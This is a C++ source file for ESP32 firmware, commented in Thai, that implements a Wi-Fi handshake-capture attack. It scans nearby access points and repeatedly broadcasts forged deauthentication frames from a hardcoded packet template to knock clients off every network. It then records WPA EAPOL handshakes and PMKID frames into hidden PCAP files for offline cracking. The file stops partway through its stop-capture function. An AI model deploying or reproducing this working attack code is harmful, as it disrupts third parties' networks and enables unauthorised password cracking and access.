#include "pcap_manager.h"
#include "globals.h"
#include "hardware.h"
#include <WiFi.h>
#include <SPIFFS.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"

// Forward declaration
void blinkLED(int duration);

// ==================== MEMORY OPTIMIZATION ====================
void optimizeMemory() {
    // ล้าง beacon trackers ที่เก่ามาก (เกิน 30 วินาที)
    uint32_t currentTime = millis();
    int removed = 0;
    
    for (int i = 0; i < beaconTrackerCount; i++) {
        if (currentTime - beaconTrackers[i].lastSeen > 30000) {
            // ย้าย tracker สุดท้ายมาแทนที่
            if (i < beaconTrackerCount - 1) {
                memcpy(&beaconTrackers[i], &beaconTrackers[beaconTrackerCount - 1], sizeof(BeaconTracker));
                i--; // ตรวจสอบ index นี้อีกครั้ง
            }
            beaconTrackerCount--;
            removed++;
        }
    }
    
    if (removed > 0) {
        Serial.printf("[MEMORY] Cleaned beacon trackers: %d removed (%d remaining)\n", removed, beaconTrackerCount);
    }
    
    // แสดงสถานะ memory
    Serial.printf("[MEMORY] Free heap: %d bytes\n", ESP.getFreeHeap());
}

// ==================== BUFFERED PCAP WRITE ====================
uint8_t pcapWriteBuffer[PCAP_BUFFER_SIZE];
uint16_t pcapBufferPos = 0;

void flushPcapBuffer() {
    if (pcapBufferPos > 0 && fileOpen) {
        pcapFile.write(pcapWriteBuffer, pcapBufferPos);
        pcapFile.flush();
        pcapBufferPos = 0;
    }
}

void writeToPcapBuffer(const uint8_t* data, uint16_t len) {
    // ถ้า buffer เต็ม flush ก่อน
    if (pcapBufferPos + len > PCAP_BUFFER_SIZE) {
        flushPcapBuffer();
    }
    
    // ถ้าข้อมูลใหญ่กว่า buffer เขียนตรงๆ
    if (len > PCAP_BUFFER_SIZE) {
        if (fileOpen) {
            pcapFile.write(data, len);
        }
        return;
    }
    
    // เพิ่มข้อมูลลง buffer
    memcpy(&pcapWriteBuffer[pcapBufferPos], data, len);
    pcapBufferPos += len;
}

// ==================== PACKET FILTERING FUNCTIONS ====================
bool shouldCaptureBeacon(uint8_t* bssid) {
    uint32_t currentTime = millis();
    
    // ค้นหา beacon tracker ที่มีอยู่
    for (int i = 0; i < beaconTrackerCount; i++) {
        if (memcmp(beaconTrackers[i].bssid, bssid, 6) == 0) {
            // ตรวจสอบว่าผ่านไป 100ms หรือยัง
            if (currentTime - beaconTrackers[i].lastSeen >= BEACON_DEDUPE_INTERVAL) {
                beaconTrackers[i].lastSeen = currentTime;
                return true;
            }
            return false; // ยังไม่ถึงเวลา
        }
    }
    
    // ไม่เจอ tracker เก่า สร้างใหม่
    if (beaconTrackerCount < MAX_BEACON_TRACKERS) {
        memcpy(beaconTrackers[beaconTrackerCount].bssid, bssid, 6);
        beaconTrackers[beaconTrackerCount].lastSeen = currentTime;
        beaconTrackerCount++;
        return true;
    }
    
    // tracker เต็ม ใช้ round-robin
    int oldestIndex = 0;
    uint32_t oldestTime = beaconTrackers[0].lastSeen;
    for (int i = 1; i < MAX_BEACON_TRACKERS; i++) {
        if (beaconTrackers[i].lastSeen < oldestTime) {
            oldestTime = beaconTrackers[i].lastSeen;
            oldestIndex = i;
        }
    }
    
    memcpy(beaconTrackers[oldestIndex].bssid, bssid, 6);
    beaconTrackers[oldestIndex].lastSeen = currentTime;
    return true;
}

bool shouldCapturePacket(uint8_t* payload, uint16_t len) {
    if (len < 24) return false; // ขนาดขั้นต่ำของ 802.11 frame
    
    uint8_t frameType = (payload[0] & 0x0C) >> 2;
    uint8_t frameSubtype = (payload[0] & 0xF0) >> 4;
    
    switch (frameType) {
        case 0: // Management frames
            switch (frameSubtype) {
                case 0x8: // Beacon
                    // BSSID อยู่ที่ offset 16 สำหรับ beacon
                    // เก็บ beacon เพราะอาจมี RSN IE ที่มี PMKID
                    return shouldCaptureBeacon(&payload[16]);
                case 0x4: // Probe Request
                case 0x5: // Probe Response
                case 0xB: // Authentication
                case 0x0: // Association Request - อาจมี PMKID
                case 0x1: // Association Response - อาจมี PMKID
                case 0x2: // Reassociation Request - อาจมี PMKID
                case 0x3: // Reassociation Response - อาจมี PMKID
                    return true;
                default:
                    return false; // ไม่เก็บ management frame อื่นๆ
            }
            
        case 2: // Data frames - เก็บเฉพาะ EAPOL
            {
                uint8_t dataSubtype = frameSubtype;
                int dataOffset = 24;
                
                // ตรวจสอบ QoS (subtype 8-15 คือ QoS frames)
                if (dataSubtype >= 8) { // QoS Data
                    dataOffset = 26;
                }
                
                // ตรวจสอบ EAPOL (0x888e)
                if (len > dataOffset + 8 && 
                    payload[dataOffset] == 0xAA && 
                    payload[dataOffset + 1] == 0xAA && 
                    payload[dataOffset + 2] == 0x03 &&
                    payload[dataOffset + 6] == 0x88 && 
                    payload[dataOffset + 7] == 0x8e) {
                    return true; // EAPOL packet (รวม PMKID ใน M1)
                }
                
                return false; // ไม่เก็บ data frame อื่นๆ
            }
            
        case 1: // Control frames - ไม่เก็บเลย
        default:
            return false;
    }
}

// ==================== DEAUTH PACKET TEMPLATE ====================
uint8_t deauthPacket[26] = {
    0xc0, 0x00,                         // Type/Subtype: Deauthentication
    0x00, 0x00,                         // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP BSSID) - จะถูกแทนที่
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP BSSID) - จะถูกแทนที่
    0x00, 0x00,                         // Sequence
    0x07, 0x00                          // Reason: Class 3 frame from nonassoc STA
};

// ==================== INITIALIZATION FUNCTIONS ====================
void initSPIFFS() {
    Serial.println("[INIT] Initializing SPIFFS...");
    
    // Try to initialize SPIFFS (formatOnFail = false)
    if (!SPIFFS.begin(false)) {
        Serial.println("[WARNING] Cannot initialize SPIFFS!");
        Serial.println("[INIT] Formatting SPIFFS...");
        
        // Try to format and restart
        if (!SPIFFS.format()) {
            Serial.println("[ERROR] Cannot format SPIFFS!");
            Serial.println("[ERROR] Please check partition scheme in Arduino IDE");
            Serial.println("[ERROR] Recommended: Tools > Partition Scheme > Default 4MB with spiffs");
            
            // Blink LED to show error
            for (int i = 0; i < 10; i++) {
                digitalWrite(LED_PIN, HIGH);
                delay(100);
                digitalWrite(LED_PIN, LOW);
                delay(100);
            }
            return;
        }
        
        Serial.println("[INIT] Format SPIFFS successful!");
        
        // Try to initialize again after format
        if (!SPIFFS.begin(false)) {
            Serial.println("[ERROR] Still cannot initialize SPIFFS after format!");
            Serial.println("[ERROR] May have hardware or partition issues");
            
            // Blink LED to show error
            for (int i = 0; i < 10; i++) {
                digitalWrite(LED_PIN, HIGH);
                delay(100);
                digitalWrite(LED_PIN, LOW);
                delay(100);
            }
            return;
        }
    }
    
    Serial.println("[INIT] SPIFFS initialized successfully!");
    
    // Check storage space
    size_t totalBytes = SPIFFS.totalBytes();
    size_t usedBytes = SPIFFS.usedBytes();
    size_t freeBytes = totalBytes - usedBytes;
    
    Serial.printf("[INIT] SPIFFS: %d KB total, %d KB used, %d KB free\n", 
                 totalBytes / 1024, usedBytes / 1024, freeBytes / 1024);
    
    // Check free space
    if (totalBytes == 0) {
        Serial.println("[ERROR] SPIFFS partition is invalid!");
        Serial.println("[ERROR] Please select Partition Scheme with SPIFFS");
        Serial.println("[ERROR] Tools > Partition Scheme > Default 4MB with spiffs");
        
        // Blink LED to show error
        for (int i = 0; i < 10; i++) {
            digitalWrite(LED_PIN, HIGH);
            delay(100);
            digitalWrite(LED_PIN, LOW);
            delay(100);
        }
        return;
    } else if (freeBytes < 50000) {
        Serial.println("[WARNING] SPIFFS space is low!");
        Serial.printf("[WARNING] Only %d KB remaining\n", freeBytes / 1024);
        
        // Show file list
        Serial.println("[INFO] Files in SPIFFS:");
        File root = SPIFFS.open("/");
        File file = root.openNextFile();
        int fileCount = 0;
        
        while (file) {
            if (!file.isDirectory()) {
                fileCount++;
                Serial.printf("[INFO] - %s (%d bytes)\n", file.name(), file.size());
            }
            file = root.openNextFile();
        }
        
        if (fileCount == 0) {
            Serial.println("[INFO] No files in SPIFFS");
        } else {
            Serial.printf("[INFO] Found %d files\n", fileCount);
            Serial.println("[INFO] Tip: Delete old files via Web Interface");
        }
    }
}

void initWiFi() {
    Serial.println("[INIT] Initializing WiFi for capture...");
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    Serial.println("[INIT] WiFi ready for capture");
}

// ==================== HELPER FUNCTIONS ====================
// ตรวจสอบว่าช่องเป็น 2.4GHz หรือ 5GHz
bool is5GHzChannel(uint8_t channel) {
#if WIFI_5GHZ_SUPPORTED
    // 5GHz channels: 36-165
    return (channel >= 36 && channel <= 165);
#else
    return false;
#endif
}

// แปลงช่องเป็นชื่อ band
const char* getChannelBand(uint8_t channel) {
    if (is5GHzChannel(channel)) {
        return "5GHz";
    } else {
        return "2.4GHz";
    }
}

// ตั้งค่า WiFi band สำหรับ ESP32-C5
void setWiFiBand(uint8_t channel) {
#if defined(CONFIG_IDF_TARGET_ESP32C5)
    if (is5GHzChannel(channel)) {
        // ตั้งค่าเป็น 5GHz band
        esp_wifi_set_band(WIFI_IF_STA, WIFI_BAND_5G);
        Serial.printf("[WIFI] Set band: 5GHz for CH%d\n", channel);
    } else {
        // ตั้งค่าเป็น 2.4GHz band
        esp_wifi_set_band(WIFI_IF_STA, WIFI_BAND_2G);
        Serial.printf("[WIFI] Set band: 2.4GHz for CH%d\n", channel);
    }
#endif
}

// เปลี่ยนช่อง WiFi พร้อม log และตั้งค่า band
void changeChannel(uint8_t channel) {
    // ตั้งค่า band สำหรับ ESP32-C5
    setWiFiBand(channel);
    
    // เปลี่ยนช่อง
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    // แสดง log
    Serial.printf("[CHANNEL] Switched to CH%d (%s)\n", channel, getChannelBand(channel));
}

String getSSIDFromBSSID(uint8_t* bssid) {
    // หา SSID จาก BSSID ในรายการ AP ที่สแกนได้
    for (int i = 0; i < apCount; i++) {
        if (memcmp(apList[i].bssid, bssid, 6) == 0) {
            return String(apList[i].ssid);
        }
    }
    return "UNKNOWN";
}

// ==================== AP SCANNING FUNCTIONS ====================
void deepScanAllAPs() {
    Serial.println("========================================");
#if WIFI_5GHZ_SUPPORTED
    Serial.println("[SCAN] Starting DEEP SCAN for all APs (2.4GHz + 5GHz)...");
#else
    Serial.println("[SCAN] Starting DEEP SCAN for all APs (2.4GHz)...");
#endif
    
    apCount = 0;
    activeChannelCount = 0;
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    // DEEP SCAN: 800ms per channel
    int n = WiFi.scanNetworks(false, true, false, 800);
    
    if (n > 0) {
        Serial.printf("[SCAN] Found %d APs\n", n);
        
        // Track which channels have APs
        bool channelHasAP[MAX_CHANNELS + 1] = {false};
        
        // Count APs by band
        int count24GHz = 0;
        int count5GHz = 0;
        
        for (int i = 0; i < n && apCount < MAX_APS; i++) {
            String ssid = WiFi.SSID(i);
            
            // Handle Hidden SSID
            if (ssid.length() == 0) {
                strcpy(apList[apCount].ssid, "#HIDDEN");
            } else {
                strncpy(apList[apCount].ssid, ssid.c_str(), 32);
                apList[apCount].ssid[32] = '\0';
            }
            
            uint8_t* bssid = WiFi.BSSID(i);
            if (bssid) {
                memcpy(apList[apCount].bssid, bssid, 6);
            }
            
            apList[apCount].channel = WiFi.channel(i);
            apList[apCount].rssi = WiFi.RSSI(i);
            
            // Count by band
            if (is5GHzChannel(apList[apCount].channel)) {
                count5GHz++;
            } else {
                count24GHz++;
            }
            
            // Mark channel as having AP
            if (apList[apCount].channel >= 1 && apList[apCount].channel <= MAX_CHANNELS) {
                channelHasAP[apList[apCount].channel] = true;
            }
            
            Serial.printf("[SCAN] AP%d: %s | CH:%d (%s) | RSSI:%d | %02X:%02X:%02X:%02X:%02X:%02X\n",
                         apCount + 1,
                         apList[apCount].ssid,
                         apList[apCount].channel,
                         getChannelBand(apList[apCount].channel),
                         apList[apCount].rssi,
                         bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
            
            apCount++;
        }
        
        // Build active channels list (channels with APs)
        for (int ch = 1; ch <= MAX_CHANNELS; ch++) {
            if (channelHasAP[ch]) {
                activeChannels[activeChannelCount++] = ch;
            }
        }
        
        // Show statistics
        Serial.println("[SCAN] ========================================");
        Serial.printf("[SCAN] Summary: %d APs (2.4GHz: %d, 5GHz: %d)\n", apCount, count24GHz, count5GHz);
        Serial.println("[SCAN] Statistics by channel:");
        
        for (int i = 0; i < activeChannelCount; i++) {
            int ch = activeChannels[i];
            int count = 0;
            for (int j = 0; j < apCount; j++) {
                if (apList[j].channel == ch) count++;
            }
            Serial.printf("[SCAN] CH%d (%s): %d APs\n", ch, getChannelBand(ch), count);
        }
        
        Serial.printf("[SCAN] Active Channels (%d): ", activeChannelCount);
        for (int i = 0; i < activeChannelCount; i++) {
            Serial.printf("%d ", activeChannels[i]);
        }
        Serial.println();
    } else {
        Serial.println("[SCAN] No APs found");
    }
    
    WiFi.scanDelete();
    Serial.println("========================================");
}

// ==================== PCAP FILE FUNCTIONS ====================
String getUniqueFilename(const char* baseFilename) {
    // ตรวจสอบว่าไฟล์มีอยู่หรือไม่
    String filename = String(baseFilename);
    
    if (!SPIFFS.exists(filename)) {
        return filename;
    }
    
    // แยกชื่อและนามสกุล
    int dotPos = filename.lastIndexOf('.');
    String name = filename.substring(0, dotPos);
    String ext = filename.substring(dotPos);
    
    // ลอง (2), (3), etc.
    for (int i = 2; i < 100; i++) {
        String newFilename = name + "(" + String(i) + ")" + ext;
        if (!SPIFFS.exists(newFilename)) {
            return newFilename;
        }
    }
    
    // สำรอง: ใช้ timestamp
    return name + "_" + String(millis()) + ext;
}

void createPcapFile() {
    // สร้างชื่อไฟล์ตามรูปแบบ /.auto_<seed-mills>.pcap
    char baseFilename[32];
    snprintf(baseFilename, sizeof(baseFilename), "/.auto_%lu.pcap", millis());
    
    // ตรวจสอบชื่อไฟล์ที่ไม่ซ้ำ
    String uniqueFilename = getUniqueFilename(baseFilename);
    strncpy(currentFilename, uniqueFilename.c_str(), sizeof(currentFilename) - 1);
    currentFilename[sizeof(currentFilename) - 1] = '\0';
    
    pcapFile = SPIFFS.open(currentFilename, "w");
    
    if (pcapFile) {
        fileOpen = true;
        
        // เขียน PCAP header
        pcap_hdr_t hdr;
        hdr.magic_number = 0xa1b2c3d4;
        hdr.version_major = 2;
        hdr.version_minor = 4;
        hdr.thiszone = 0;
        hdr.sigfigs = 0;
        hdr.snaplen = 65535;
        hdr.network = 105; // IEEE 802.11
        
        pcapFile.write((uint8_t*)&hdr, sizeof(pcap_hdr_t));
        pcapFile.flush();
        
        Serial.printf("[PCAP] Created file: %s\n", currentFilename);
    } else {
        fileOpen = false;
        Serial.println("[ERROR] Cannot create PCAP file!");
    }
}

void closePcapFile() {
    if (fileOpen && pcapFile) {
        // Flush buffer before closing file
        flushPcapBuffer();
        
        pcapFile.close();
        fileOpen = false;
        Serial.printf("[PCAP] Closed file: %s\n", currentFilename);
    }
}

// ==================== PACKET HANDLER ====================
void processEAPOLPacket(uint8_t* payload, uint16_t len, int eapolOffset) {
    // ดึง BSSID (Address 3, bytes 16-21)
    uint8_t bssid[6];
    memcpy(bssid, &payload[16], 6);
    
    // หา SSID จาก BSSID
    String ssid = getSSIDFromBSSID(bssid);
    
    // หาหรือสร้าง handshake entry
    int idx = -1;
    for (int i = 0; i < handshakeCount; i++) {
        if (memcmp(handshakes[i].bssid, bssid, 6) == 0) {
            idx = i;
            break;
        }
    }
    
    if (idx == -1 && handshakeCount < MAX_HANDSHAKES) {
        idx = handshakeCount++;
        memcpy(handshakes[idx].bssid, bssid, 6);
        handshakes[idx].channel = currentChannel;
        handshakes[idx].messageFlags = 0;
        handshakes[idx].timestamp = millis();
        handshakes[idx].complete = false;
        
        Serial.printf("[HANDSHAKE] New #%d: %s | %02X:%02X:%02X:%02X:%02X:%02X | CH%d\n",
                     handshakeCount,
                     ssid.c_str(),
                     bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                     currentChannel);
    }
    
    if (idx >= 0 && len > eapolOffset + 6) {
        uint8_t packetType = payload[eapolOffset + 1];
        
        if (packetType == 3) { // Key frame
            uint16_t keyInfo = (payload[eapolOffset + 5] << 8) | payload[eapolOffset + 6];
            
            bool isPairwise = (keyInfo & 0x0008) != 0;
            bool hasInstall = (keyInfo & 0x0040) != 0;
            bool hasAck = (keyInfo & 0x0080) != 0;
            bool hasMic = (keyInfo & 0x0100) != 0;
            
            if (isPairwise) {
                if (hasAck && !hasMic && !hasInstall) {
                    // Message 1
                    if (!(handshakes[idx].messageFlags & 0x01)) {
                        handshakes[idx].messageFlags |= 0x01;
                        Serial.printf("[HANDSHAKE] M1 #%d: %s | %02X:%02X:%02X:%02X:%02X:%02X | CH%d\n",
                                     idx + 1,
                                     ssid.c_str(),
                                     bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                                     currentChannel);
                        blinkLED(100); // กระพิบสั้น
                    }
                } else if (!hasAck && hasMic && !hasInstall) {
                    // Message 2 or 4
                    if ((handshakes[idx].messageFlags & 0x01) && !(handshakes[idx].messageFlags & 0x02)) {
                        handshakes[idx].messageFlags |= 0x02;
                        Serial.printf("[HANDSHAKE] M2 #%d: %s | %02X:%02X:%02X:%02X:%02X:%02X | CH%d\n",
                                     idx + 1,
                                     ssid.c_str(),
                                     bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                                     currentChannel);
                        blinkLED(100); // กระพิบสั้น
                    } else if ((handshakes[idx].messageFlags & 0x04) && !(handshakes[idx].messageFlags & 0x08)) {
                        handshakes[idx].messageFlags |= 0x08;
                        Serial.printf("[HANDSHAKE] M4 #%d: %s | %02X:%02X:%02X:%02X:%02X:%02X | CH%d\n",
                                     idx + 1,
                                     ssid.c_str(),
                                     bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                                     currentChannel);
                        blinkLED(500); // ติดยาว 500ms
                    }
                } else if (hasAck && hasMic && hasInstall) {
                    // Message 3
                    if (!(handshakes[idx].messageFlags & 0x04)) {
                        handshakes[idx].messageFlags |= 0x04;
                        Serial.printf("[HANDSHAKE] M3 #%d: %s | %02X:%02X:%02X:%02X:%02X:%02X | CH%d\n",
                                     idx + 1,
                                     ssid.c_str(),
                                     bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                                     currentChannel);
                        blinkLED(100); // กระพิบสั้น
                    }
                }
            }
            
            // ตรวจสอบว่าครบ 4 message หรือไม่
            if (handshakes[idx].messageFlags == 0x0F && !handshakes[idx].complete) {
                handshakes[idx].complete = true;
                
                // นับจำนวน handshake ที่สมบูรณ์
                int completeCount = 0;
                for (int i = 0; i < handshakeCount; i++) {
                    if (handshakes[i].complete) completeCount++;
                }
                
                Serial.println("========================================");
                Serial.printf("[SUCCESS] ✓ HANDSHAKE COMPLETE! #%d (Total: %d)\n", idx + 1, completeCount);
                Serial.printf("[SUCCESS] SSID: %s\n", ssid.c_str());
                Serial.printf("[SUCCESS] BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
                             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
                Serial.printf("[SUCCESS] Channel: %d\n", currentChannel);
                Serial.printf("[SUCCESS] File: %s\n", currentFilename);
                Serial.println("========================================");
                
                // กระพิบ LED 3 ครั้งเพื่อแสดงความสำเร็จ
                for (int i = 0; i < 3; i++) {
                    blinkLED(200);
                    delay(100);
                }
            }
        }
    }
}

void packetHandler(void* buf, wifi_promiscuous_pkt_type_t type) {
    // Optimization: ตรวจสอบ heap ก่อนประมวลผล
    if (ESP.getFreeHeap() < 8000) return;

    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;

    // Optimization: ตรวจสอบขนาด packet ที่เหมาะสม
    if (len < 24 || len > 1500) return;

    packetCount++;

    // ใช้ packet filtering ใหม่
    if (!shouldCapturePacket(payload, len)) {
        return; // ไม่เก็บ packet นี้
    }

    filteredPacketCount++;

    // ตรวจสอบ EAPOL เฉพาะ Data frame ที่ผ่านการกรองแล้ว
    uint8_t frameType = (payload[0] & 0x0C) >> 2;
    if (frameType == 2) { // Data frame only
        uint8_t frameSubtype = (payload[0] & 0xF0) >> 4;
        int dataOffset = (frameSubtype >= 8) ? 26 : 24; // QoS Data : Normal Data

        // ตรวจสอบ EAPOL signature
        if (len > dataOffset + 8 &&
            payload[dataOffset] == 0xAA &&
            payload[dataOffset + 1] == 0xAA &&
            payload[dataOffset + 2] == 0x03 &&
            payload[dataOffset + 6] == 0x88 &&
            payload[dataOffset + 7] == 0x8e) {

            processEAPOLPacket(payload, len, dataOffset + 8);
        }
    }

    // เขียนไฟล์เฉพาะ packet ที่ผ่านการกรอง - ใช้ buffered write
    if (fileOpen) {
        pcaprec_hdr_t pkthdr;
        uint32_t timestamp = millis();
        pkthdr.ts_sec = timestamp / 1000;
        pkthdr.ts_usec = (timestamp % 1000) * 1000;
        pkthdr.incl_len = len;
        pkthdr.orig_len = len;

        // เขียนผ่าน buffer
        writeToPcapBuffer((uint8_t*)&pkthdr, sizeof(pcaprec_hdr_t));
        writeToPcapBuffer(payload, len);

        // Flush ทุก 30 packets หรือเมื่อ buffer เกือบเต็ม
        static uint8_t flushCounter = 0;
        if (++flushCounter >= 30 || pcapBufferPos > (PCAP_BUFFER_SIZE - 1600)) {
            flushPcapBuffer();
            flushCounter = 0;
        }
    }
}


// ==================== DEAUTH FUNCTIONS ====================
void sendDeauthToChannel(uint8_t channel) {
    Serial.printf("[DEAUTH] Sending deauth to CH%d for %d seconds...\n", channel, DEAUTH_DURATION / 1000);
    
    uint32_t startTime = millis();
    int sentCount = 0;
    
    // Optimization: Count APs in this channel (exclude APs with complete handshake)
    int targetCount = 0;
    for (int i = 0; i < apCount; i++) {
        if (apList[i].channel == channel) {
            // Check if this AP already has complete handshake
            bool hasCompleteHandshake = false;
            for (int j = 0; j < handshakeCount; j++) {
                if (memcmp(handshakes[j].bssid, apList[i].bssid, 6) == 0 && handshakes[j].complete) {
                    hasCompleteHandshake = true;
                    break;
                }
            }
            
            if (!hasCompleteHandshake) {
                targetCount++;
            }
        }
    }
    
    if (targetCount == 0) {
        Serial.printf("[DEAUTH] No APs to deauth in CH%d (all have HS)\n", channel);
        return;
    }
    
    while (millis() - startTime < DEAUTH_DURATION) {
        // Send deauth to all APs in this channel (exclude APs with complete handshake)
        for (int i = 0; i < apCount; i++) {
            if (apList[i].channel == channel) {
                // Check if this AP already has complete handshake
                bool hasCompleteHandshake = false;
                for (int j = 0; j < handshakeCount; j++) {
                    if (memcmp(handshakes[j].bssid, apList[i].bssid, 6) == 0 && handshakes[j].complete) {
                        hasCompleteHandshake = true;
                        break;
                    }
                }
                
                // Send deauth only to APs without handshake
                if (!hasCompleteHandshake) {
                    // Insert AP BSSID into deauth packet
                    memcpy(&deauthPacket[10], apList[i].bssid, 6); // Source (AP)
                    memcpy(&deauthPacket[16], apList[i].bssid, 6); // BSSID (AP)
                    
                    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
                    deauthCount++;
                    sentCount++;
                }
            }
        }
        delay(DEAUTH_INTERVAL);
        
        // Optimization: Check memory during sending
        if (ESP.getFreeHeap() < 10000) {
            Serial.println("[DEAUTH] Low memory - stopping early");
            break;
        }
    }
    
    Serial.printf("[DEAUTH] Finished CH%d: %d packets to %d APs (skipped APs with HS)\n", channel, sentCount, targetCount);
}

// ==================== MAIN CAPTURE FUNCTIONS ====================
void startCapture() {
    Serial.println("========================================");
    Serial.println("[CAPTURE] Starting handshake capture");
    Serial.println("[CAPTURE] Pattern: Deauth 2s -> Capture 5s -> Hop");
    Serial.println("[CAPTURE] Hop only to channels with APs");
    Serial.println("[CAPTURE] Filter: Beacon(100ms), Probe, Auth, Assoc, EAPOL");
    Serial.println("========================================");
    
    handshakeCount = 0;
    packetCount = 0;
    filteredPacketCount = 0;
    deauthCount = 0;
    cycleCount = 0;
    beaconTrackerCount = 0;
    pcapBufferPos = 0;
    memset(beaconTrackers, 0, sizeof(beaconTrackers));
    isCapturing = true;
    
    // ตั้งค่า active channel
    if (activeChannelCount > 0) {
        activeChannelIndex = 0;
        currentChannel = activeChannels[0];
    } else {
        // Fallback ถ้าไม่มี AP (ไม่น่าเกิด)
        currentChannel = 1;
    }
    
    // สร้างไฟล์ PCAP
    createPcapFile();
    
    // เริ่ม WiFi promiscuous mode
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&packetHandler);
    
    // เริ่มที่ช่องแรกที่มี AP
    channelStartTime = millis();
    isDeauthPhase = true;
    changeChannel(currentChannel);  // ใช้ฟังก์ชันใหม่ที่มี log
    
    Serial.printf("[CAPTURE] เริ่มที่ CH%d (%s) - Phase: DEAUTH (Active channels: %d)\n", 
                  currentChannel, getChannelBand(currentChannel), activeChannelCount);
}

void updateCapture() {
    if (!isCapturing) return;
    
    uint32_t currentTime = millis();
    uint32_t timeOnChannel = currentTime - channelStartTime;
    
    if (isDeauthPhase) {
        // Phase 1: ส่ง Deauth เป็นเวลา 2 วินาที
        if (timeOnChannel >= DEAUTH_DURATION) {
            Serial.printf("[CAPTURE] CH%d - เปลี่ยนเป็น Phase: CAPTURE\n", currentChannel);
            isDeauthPhase = false;
            channelStartTime = currentTime; // รีเซ็ตเวลา
        } else {
            // ส่ง deauth packets อย่างต่อเนื่อง
            static uint32_t lastDeauth = 0;
            if (currentTime - lastDeauth >= DEAUTH_INTERVAL) {
                lastDeauth = currentTime;
                
                // ส่ง deauth ไปทุก AP ในช่องปัจจุบัน (ยกเว้น AP ที่ได้ handshake แล้ว)
                for (int i = 0; i < apCount; i++) {
                    if (apList[i].channel == currentChannel) {
                        // ตรวจสอบว่า AP นี้มี handshake สมบูรณ์แล้วหรือไม่
                        bool hasCompleteHandshake = false;
                        for (int j = 0; j < handshakeCount; j++) {
                            if (memcmp(handshakes[j].bssid, apList[i].bssid, 6) == 0 && handshakes[j].complete) {
                                hasCompleteHandshake = true;
                                break;
                            }
                        }
                        
                        // ส่ง deauth เฉพาะ AP ที่ยังไม่ได้ handshake
                        if (!hasCompleteHandshake) {
                            memcpy(&deauthPacket[10], apList[i].bssid, 6);
                            memcpy(&deauthPacket[16], apList[i].bssid, 6);
                            
                            esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
                            deauthCount++;
                        }
                    }
                }
            }
        }
    } else {
        // Phase 2: Capture handshake เป็นเวลา 5 วินาที
        if (timeOnChannel >= CAPTURE_DURATION) {
            // เปลี่ยนช่อง - Hop เฉพาะช่องที่มี AP
            if (activeChannelCount > 0) {
                activeChannelIndex++;
                if (activeChannelIndex >= activeChannelCount) {
                    activeChannelIndex = 0;
                    cycleCount++;
                    
                    // นับ handshake ที่สมบูรณ์
                    int completeCount = 0;
                    for (int i = 0; i < handshakeCount; i++) {
                        if (handshakes[i].complete) completeCount++;
                    }
                    
                    Serial.println("========================================");
                    Serial.printf("[CAPTURE] รอบที่ %d เสร็จ! HS: %d/%d, PKT: %lu, DEAUTH: %lu\n", 
                                 cycleCount, completeCount, handshakeCount, packetCount, deauthCount);
                    Serial.println("[CAPTURE] เริ่มสแกน AP ใหม่เพื่อหา SSID ใหม่...");
                    Serial.println("========================================");
                    
                    // หยุด promiscuous mode ชั่วคราว
                    esp_wifi_set_promiscuous(false);
                    
                    // สแกน AP ใหม่
                    deepScanAllAPs();
                    
                    // Optimization: ทำความสะอาด memory หลังสแกน
                    optimizeMemory();
                    
                    // เริ่ม promiscuous mode ใหม่
                    esp_wifi_set_promiscuous(true);
                    esp_wifi_set_promiscuous_rx_cb(&packetHandler);
                    
                    // รีเซ็ต index ถ้าจำนวน active channels เปลี่ยน
                    if (activeChannelIndex >= activeChannelCount) {
                        activeChannelIndex = 0;
                    }
                    
                    Serial.println("========================================");
                    Serial.printf("[CAPTURE] เริ่มรอบที่ %d - พบ AP รวม %d ตัว ใน %d ช่อง\n", 
                                 cycleCount + 1, apCount, activeChannelCount);
                    Serial.println("========================================");
                }
                
                // เปลี่ยนไปช่องถัดไป (เฉพาะช่องที่มี AP)
                currentChannel = activeChannels[activeChannelIndex];
                Serial.printf("[CAPTURE] ========================================\n");
                Serial.printf("[CAPTURE] Hop ไป CH%d (%s) - (%d/%d active channels)\n", 
                             currentChannel, getChannelBand(currentChannel), 
                             activeChannelIndex + 1, activeChannelCount);
                Serial.printf("[CAPTURE] ========================================\n");
            } else {
                // Fallback: ถ้าไม่มี active channels (ไม่น่าเกิด)
                currentChannel++;
                if (currentChannel > MAX_CHANNELS) {
                    currentChannel = 1;
                }
                Serial.printf("[CAPTURE] Fallback hop ไป CH%d\n", currentChannel);
            }
            
            // เปลี่ยนช่องและรีเซ็ตเวลา
            changeChannel(currentChannel);  // ใช้ฟังก์ชันใหม่ที่มี log และตั้งค่า band
            channelStartTime = currentTime;
            isDeauthPhase = true;
            
            Serial.printf("[CAPTURE] CH%d (%s) - Phase: DEAUTH\n", currentChannel, getChannelBand(currentChannel));
        }
    }
}

void stopCapture() {
    if (!isCapturing) return;
    
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
    
    closePcapFile();
    isCapturing = false;
    
    // นับ handshake ที่สมบูรณ์
    int completeCount = 0;
    for (int i = 0; i < handshakeCount; i++) {
        if (handshakes[i].complete) completeCount++;
    }
    
    // คำนวณ filter efficiency
